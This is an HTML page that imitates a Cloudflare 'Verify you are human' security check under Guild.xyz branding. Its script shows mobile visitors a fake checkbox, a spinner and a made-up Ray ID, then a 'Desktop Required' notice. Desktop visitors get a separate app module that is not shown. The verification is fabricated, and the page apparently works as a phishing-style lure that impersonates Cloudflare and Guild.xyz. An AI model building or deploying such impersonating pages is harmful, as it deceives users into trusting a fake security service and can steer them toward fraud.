<!doctype html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<link rel="icon" type="image/svg+xml" href="/favicon.ico" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Base</title>

<style>

body{
margin:0;
font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
}

/* MOBILE VERIFICATION SCREEN */

.verify-body{
width:100vw;
height:100dvh;
background:black;
color:white;
position:relative;
}

.verify-container{
padding:90px 20px 0;
max-width:420px;
}

.title{
font-size:34px;
font-weight:800;
line-height:1;
letter-spacing:-.04em;
}

.subtitle{
margin-top:26px;
font-size:16px;
font-weight:600;
}

.copy{
margin-top:12px;
color:#b5b5b5;
font-size:13px;
line-height:1.5;
max-width: 400px;
}

.cloud-image{
  width: 70px;
height: auto;
}

.guild-image{
  height: 24px;
  width: 24px;
  margin-left: 5px;
  filter: invert(1) brightness(2);
}

.verify-card{
margin-top:22px;
min-width:210px;
border:1px solid #3a3a3a;
background:#111;
display:flex;
align-items:center;
justify-content:space-between;
padding:10px 12px;
cursor:pointer;
}

.checkbox{
width:16px;
height:16px;
border:1px solid #888;
}

.spinner{
width:16px;
height:16px;
border:2px solid #444;
border-top:2px solid white;
border-radius:50%;
animation:spin 1s linear infinite;
}

@keyframes spin{
to{transform:rotate(360deg)}
}

.footer{
position:absolute;
bottom:20px;
left:20px;
right:20px;
border-top:1px solid #3a3a3a;
padding-top:12px;
text-align:center;
font-size:11px;
color:#999;
}

/* DESKTOP BLOCK SCREEN */

.desktop-block-body{
min-height:100vh;
display:flex;
align-items:center;
justify-content:center;
background:#f5f5f5;
padding:24px;
}

.desktop-block-box{
background:white;
padding:40px;
border-radius:14px;
text-align:center;
max-width:420px;
width:100%;
box-shadow:0 10px 30px rgba(0,0,0,.1);
}

.desktop-block-box h1{
margin:10px 0 12px;
font-size:24px;
}

.desktop-block-box p{
margin:0;
color:#555;
line-height:1.6;
}

.desktop-block-icon{
font-size:48px;
}

</style>
</head>

<body>

<div id="root"></div>

<script>
(function(){

const ua=navigator.userAgent.toLowerCase()

const mobileAgents=[
"android","iphone","ipad","ipod",
"blackberry","windows phone","opera mini","mobile"
]

const isMobile=mobileAgents.some(a=>ua.includes(a))
window.__BLOCK_MOBILE__=isMobile

if(isMobile){

document.body.className="verify-body"

document.getElementById("root").innerHTML=`

<div class="verify-container">

<div class="title">
<img src="/guild-house.svg" class="guild-image"> Guild.xyz
</div>

<div class="subtitle">
Performing security verification
</div>

<p class="copy">
This website uses a security service to protect against malicious bots.
This page is displayed while the website verifies you are not a bot.
</p>

<div class="verify-card" id="verify">

<div style="display:flex;gap:8px;align-items:center">

<div id="icon" class="checkbox"></div>

<span style="font-size:12px">
Verify you are human
</span>

</div>

<div style="text-align:right;font-size:9px">

<div style="font-weight:600">
  <img src="/cloudflare.svg" alt="cloudfare security check" class="cloud-image">
</div>

<div style="font-size:8px;color:#999">
Privacy · Help
</div>

</div>

</div>

</div>

<div class="footer">
Ray ID: <b>9d925730cdcaa31a4</b><br>
Performance and Security by Cloudflare
</div>

`

const card=document.getElementById("verify")
const icon=document.getElementById("icon")

card.onclick=function(){

icon.className="spinner"

setTimeout(()=>{

document.body.className="desktop-block-body"

document.getElementById("root").innerHTML=`

<div class="desktop-block-box">

<div class="desktop-block-icon">
💻
</div>

<h1>
Desktop Required
</h1>

<p>
This website is not available on mobile devices.<br>
Please open it on a desktop or laptop browser.
</p>

</div>

`

},1800)

}

}

})()
</script>

<script type="module">
if(!window.__BLOCK_MOBILE__){
import("/src/main.jsx")
}
</script>

</body>
</html>
